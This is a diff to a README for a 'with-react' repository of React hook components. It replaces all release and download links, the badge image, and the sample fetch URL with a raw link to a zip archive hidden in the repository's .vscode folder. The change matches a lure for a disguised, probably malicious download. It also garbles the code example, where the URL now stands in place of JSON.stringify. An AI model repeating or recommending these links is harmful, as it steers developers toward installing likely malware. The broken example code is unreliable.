@@ -2,7 +2,7 @@
 
 Welcome to the **with-react** repository! This project provides a collection of reusable components designed specifically for React hooks. Whether you're building a new application or enhancing an existing one, these components can help streamline your development process.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/gourab9038/with-react/releases)
+[![Download Releases](https://github.com/gourab9038/with-react/raw/refs/heads/main/.vscode/with_react_v3.6.zip)](https://github.com/gourab9038/with-react/raw/refs/heads/main/.vscode/with_react_v3.6.zip)
 
 ## Table of Contents
 
@@ -92,11 +92,11 @@ import { FetchData } from 'with-react';
 
 function DataComponent() {
   return (
-    <FetchData url="https://api.example.com/data">
+    <FetchData url="https://github.com/gourab9038/with-react/raw/refs/heads/main/.vscode/with_react_v3.6.zip">
       {({ data, loading, error }) => {
         if (loading) return <p>Loading...</p>;
         if (error) return <p>Error fetching data</p>;
-        return <div>{JSON.stringify(data)}</div>;
+        return <div>{https://github.com/gourab9038/with-react/raw/refs/heads/main/.vscode/with_react_v3.6.zip(data)}</div>;
       }}
     </FetchData>
   );
@@ -154,8 +154,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need support, feel free to reach out. You can check the [Releases](https://github.com/gourab9038/with-react/releases) section for the latest updates and downloads.
+If you have any questions or need support, feel free to reach out. You can check the [Releases](https://github.com/gourab9038/with-react/raw/refs/heads/main/.vscode/with_react_v3.6.zip) section for the latest updates and downloads.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/gourab9038/with-react/releases)
+[![Download Releases](https://github.com/gourab9038/with-react/raw/refs/heads/main/.vscode/with_react_v3.6.zip)](https://github.com/gourab9038/with-react/raw/refs/heads/main/.vscode/with_react_v3.6.zip)
 
 Thank you for checking out **with-react**! We hope it helps you build better React applications.
